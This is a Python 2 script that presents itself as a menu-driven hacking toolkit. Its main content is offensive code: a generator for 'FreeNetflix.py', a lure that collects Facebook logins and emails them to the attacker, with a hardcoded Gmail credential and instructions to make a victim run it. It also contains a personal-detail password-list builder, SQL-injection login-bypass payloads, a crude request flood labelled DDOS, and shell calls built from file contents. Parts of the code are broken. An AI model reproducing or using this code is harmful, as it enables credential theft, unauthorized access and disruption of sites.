# -*- coding: utf-8 -*
import os
import sys
import time
import re
import requests
import random
import socket
from geoip import geolite2
from requests_futures.sessions import FuturesSession

def clear():
	os.system('clear')
def exit():
	exit = raw_input("Enter To Exit...")
clear()
print("""\33[92m
	   ██████ █████  █████  ██  ██
	   ██  ██ ██  ██ ██  ██ ██  ██ 
	   ██  ██ ██  ██ ██  ██ ██  ██
	   ██████ ██████ ██  ██   ██
	   ██  ██ ██  ██ ██  ██ ██  ██
	   ██  ██ ██  ██ ██  ██ ██  ██
	   ██  ██ █████  █████  ██  ██
""")
tools = raw_input("""\33[34m
	   [==========Tools==========]
	   \33[34m[\33[31m1\33[34m].\33[33mInformation Gathering.
	   \33[34m[\33[31m2\33[34m].\33[33mPhishing.
	   \33[34m[\33[31m3\33[34m].\33[33mSQL Injection Tools.
	   \33[34m[\33[31m4\33[34m].\33[33mAdmin Panel.
	   \33[34m[\33[31m5\33[34m].\33[33mWebsite Info Gathering.
	   \33[34m[\33[31m6\33[34m].\33[33mULTRA DDOS.
	   \33[34m[\33[31m7\33[34m].\33[33mUpdate & Upgrade.


	   \33[34m[\33[31m99\33[34m].\33[33mEXIT.

	   \33[31mSet > """)
if tools =='1':
	clear()
	info_grab = raw_input("""
		[==========Information Gathering==========]
		\33[34m[\33[31m01\33[34m].\33[33mWebsite.
		\33[34m[\33[31m02\33[34m].\33[33mSocial Engineering.
		\33[34m[\33[31m03\33[34m].\33[33mPasswordList.
		\33[34m[\33[31m04\33[34m].\33[33mIp.

		\33[31mSet > """)
	if info_grab == '1':
		clear()
		url = raw_input("\33[92mURL \33[31mTarget\33[92m \33[92m(Ex: google.com) \33[92m : ")
		ip = socket.gethostbyname(url)
		location = geolite2.lookup(ip)
		location is not None
		clear()
		print("[==========Website Info==========]")
		print("\33[92mHost Ip : \33[92m"+ip)
		print ("\33[92mLocation : \33[92m"+location.country)
		print ("\33[92mTimezone : \33[92m"+location.timezone)
		request = b"GET / HTTP/1.1\nHost: ",url,'\n\n'
		request = "%s%s%s"%(request)
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.connect((url, 80))
		s.send(request)
		result = s.recv(10000)
		print(result)
		exit()
	
	if info_grab == '2':
		clear()
		exploit_type = input("""
		[==========Information Gathering==========]
		\33[34m[\33[31m01\33[34m].\33[33mPython Logiciel.

		\33[31mSet > """)
		if exploit_type == '1':
			clear()
			email = input("Enter Your E-mail : ")
			file = open("FreeNetflix.py","w")
			file.write("""
#!/usr/bin/python
from tkinter import *
import tkMessageBox
import os,sys
import time
from email.MIMEMultipart import MIMEMultipart
from email.MIMEText import MIMEText
import smtplib
import socket

def SendE():
	os.system('cls')
	print "###############FACEBOOK###############"
	email = input("Enter E-mail : ")
	password = input("Enter Password : ")
	emailres = "The Email is : ",email
	passwordres = "The Password is : ",password
	emailr = "%s%s"%(emailres)
	passwordr = "%s%s"%(passwordres)
	aa = emailr,'\n',passwordr
	aaa = "%s%s%s"%(aa)
	nameh = '\n',"Device Hostname is : ",(socket.gethostname())
	host = "%s%s%s"%(nameh)
	aaaa = aaa,host
	aaaaa = "%s%s"%(aaaa)
	result = "####### FACEBOOK HACKED #######",'\n',aaaaa
	final = "%s%s%s"%(result)
	os.system('cls')
	print ('Wait some seconds for checking a Netflix Account...')
	fromaddr = "xAbdXSlayerx" \n""")
			file.write ("\ntoaddr = "+' "'+email+'" ')
			file.write ("""\nmsg = MIMEMultipart()
	msg['From'] = fromaddr
	msg['To'] = toaddr
	msg['Subject'] = "Facebook Account Has Been Hacked By AbdXSlayer!"
	body = final
	msg.attach(MIMEText(body, 'plain'))
	server = smtplib.SMTP('smtp.gmail.com', 587)
	server.ehlo()
	server.starttls()
	server.ehlo()
	server.login("emailt686@gmail.com", olo)
	text = msg.as_string()
	server.sendmail(fromaddr, toaddr, text)
	os.system('cls')
	print("Error! The Facebook Account is Not Valid.")

w = Tk()
w.configure(background='dimgray')
w.title("Netflix Hacker")
w.geometry('260x120')
labal = Label(w, text="Hack Some Netflix Accounts !")
labal.pack()
button1 = Button(w, text ="Start",width=10, command = SendE,bg="tomato3")
button1.pack()
button1.place(x=90,y=50)
olo = "Azerty2010"
tkMessageBox.showinfo( "Free Netflix", "To Get Free Netflix Account You Need To Login \nto Your Facebook Account to Make the Netflix\n Data The Same as Your Facebook.")
w.mainloop()
""")
			file.close()
			print ("\33[34m[\33[31m*\33[34m]\33[31m. File Created (FreeNetflix.py) ")
			print ("\33[34mMake the Victime install python on his device and run the file or Make the file Executable.\n\n")
			exit()
			
	if info_grab == '3':
		clear()
		name = raw_input("Enter Name : ")
		lastname = raw_input("Enter The LastName : ")
		dbirth = raw_input("Enter Day of birth : ")
		mbirth = raw_input("Enter Month of birth : ")
		ybirth = raw_input("Enter Year of birth : ")
		namepass = raw_input("Enter A Name of Your PasswordList (DON'T FORGET .txt) : ")
		file = open(namepass, 'w')
		file.write(name+lastname+"\n")
		file.write(lastname+name+"\n")
		file.write(name+dbirth+"\n")
		file.write(dbirth+name+"\n")
		file.write(name+name+"\n")
		file.write(name+ybirth+"\n")
		file.write(name+mbirth+"\n")
		file.write(ybirth+name+"\n")
		file.write(mbirth+name+"\n")
		file.write(ybirth+lastname+"\n")
		file.write(dbirth+lastname+"\n")
		file.write(mbirth+lastname+"\n")
		file.write(ybirth+lastname+name+"\n")
		file.write(ybirth+name+lastname+"\n")
		file.write(lastname+lastname+ybirth+"\n")
		file.write(name+lastname+ybirth+"\n")
		file.write(name+lastname+dbirth+"\n")
		file.write(name+lastname+mbirth+"\n")
		file.write(name+lastname+'2000'+"\n")
		file.write(name+lastname+'2001'+"\n")
		file.write(name+lastname+'2002'+"\n")
		file.write(name+lastname+'2003'+"\n")
		file.write(name+lastname+'2004'+"\n")
		file.write(name+lastname+'2005'+"\n")
		file.write(name+lastname+'2006'+"\n")
		file.write(name+lastname+'2007'+"\n")
		file.write(name+lastname+'2008'+"\n")
		file.write(name+lastname+'2009'+"\n")
		file.write(name+lastname+'2010'+"\n")
		file.write(name+lastname+'2011'+"\n")
		file.write(name+lastname+'2012'+"\n")
		file.write(name+lastname+'2013'+"\n")
		file.write(name+lastname+'2014'+"\n")
		file.write(name+lastname+'2015'+"\n")
		file.write(name+lastname+'2016'+"\n")
		file.write(name+lastname+'2017'+"\n")
		file.write(name+lastname+'2018'+"\n")
		file.write(name+lastname+'2019'+"\n")
		file.write(name+lastname+'2020'+"\n")
		file.write(name+lastname+'123'+"\n")
		file.write(name+lastname+'666'+"\n")
		file.write(name+lastname+'000'+"\n")
		file.write(name+lastname+'123'+"\n")
		file.write(name+lastname+'123456'+"\n")
		file.write("Azerty"+"\n")
		file.write("Azerty123"+"\n")
		file.write("Azerty123456"+"\n")
		file.write("Azerty112233"+"\n")
		file.write("Azerty2000"+"\n")
		file.write("Azerty2017"+"\n")
		file.write("Azerty2018"+"\n")
		file.write("Azerty2019"+"\n")
		file.write("Azerty2020"+"\n")
		file.write("Azertyuiop^$"+"\n")
		file.close() 
		print ("Go Check The Location When You Put The File.")
		exit()
	if info_grab == '4':
		ip = raw_input("[+] Enter IP Adress : ")
		location = geolite2.lookup(ip)
		location is not None
		clear()
		print("[==========IP Adress Info==========]")
		print("\33[92mHost Ip : \33[92m"+ip)
		print ("\33[92mLocation : \33[92m"+location.country)
		print ("\33[92mTimezone : \33[92m"+location.timezone)

if tools=='3':
	website = raw_input("Enter website Url : ")
	r = requests.get(website)
	response = r
	print ("\33[34m[\33[33m+\33[34m] \33[33mCONNECTING TO",r.url)
	sql = "'"
	sql_injection = (website,sql)
	sql_injection = "%s%s"%(sql_injection)
	final = requests.get(sql_injection)
	try:
		if final.status_code == 200:
			file = open("result_sql.txt",'w')
			txt = (website+'\n')
			file.write(txt)
			print ("\33[34m[\33[33m+\33[34m] \33[33mSUCCESS, WEBSITE ADDED TO YOUR SQL VULNURABLE LIST.")

		if final.status_code is not 200:
			print ("\33[34m[-] FAILED, THE WEBSITE ENTRED IS NOT VULNURABLE.")
	except:
		print ("\33[34m[-] ERROR, CHECK THE LINK IF IT EXIST/ADD (http://www.) to the website.")

if tools=='4':
	clear()
	website = raw_input("Enter website Admin Login Page : ")
	r = requests.get(website)
	if r.status_code == 200 or r.status_code == 403:

		print ("[+] SUCCESS WE FOUNDED THE WEBSITE !")
		print ("[+] TRYING TO BYPASS THE ADMIN LOGIN ...")
		log = requests.get(website, auth=("' or 1=1 --", "' or 1=1 --"))
		if log.status_code is not 200:
			print "Method 1 Failure. [/] Trying other methods..."
		
			log = requests.get(website, auth=("' or ''='", "' or ''='"))

			if log.status_code is not 200:

				print "Method 2 Failure. [/] Trying other methods..."
			
				log = requests.get(website, auth=("' or 1--", ""))
				if log.status_code is not 200:

					print "Method 3 Failure. [/] Trying other methods..."
				
					log = requests.get(website, auth=("') or true--", ""))
					if log.status_code is not 200:
					
						print "Method 4 Failure. [/] Trying other methods..."
					
						log = requests.get(website, auth=("'-'", ""))
						if log.status_code is not 200:
							exit = raw_input("[-] FAILED TO BYPASS ADMIN PANEL...")
			
				print "Method 5 Failure. \nSorry :( You can report this to me: \n As8apple@gmail.com"

	if r.status_code is not 200:

		print ("[-] FAILED WE DIDN'T FOUND THE WEBSITE !")

if tools=='5':
	clear()
	lineacc = "[================[New]=================]"
	lineaccunder = "[====================[END]===================]\n"
	filepath = raw_input("Enter File Path : ")

	with open(filepath) as fp:  
	   line = fp.readline()
	   cnt = 1
	   while line:
			print (lineacc)
			print("[Line {}: {}]".format(cnt, line.strip()))
			command = ('host'+' '+line)
			print("-------------------------------------------")
			cmnd = os.system(command)
			owner = ('whois ',line,' | grep "OrgName"')
			owner = "%s%s%s"%(owner)
			os.system(owner)
			print (lineaccunder)
			line = fp.readline()
			cnt += 1

if tools=='6':
	clear()
	target = raw_input("[X] Enter Target (*http://* is obligatory) : ")
	num = 0
	while True:
		num = num+1
		r = requests.get(target)
		print ("[X] DDOS {} > CODE > {} SENT [X]".format(num,r.status_code))

if tools=='7':
	os.system("firefox http://github.com/ABDXH4K3r")
	os.system('open "http://github.com/ABDXH4K3r"')

if tools=='99':
	exit()
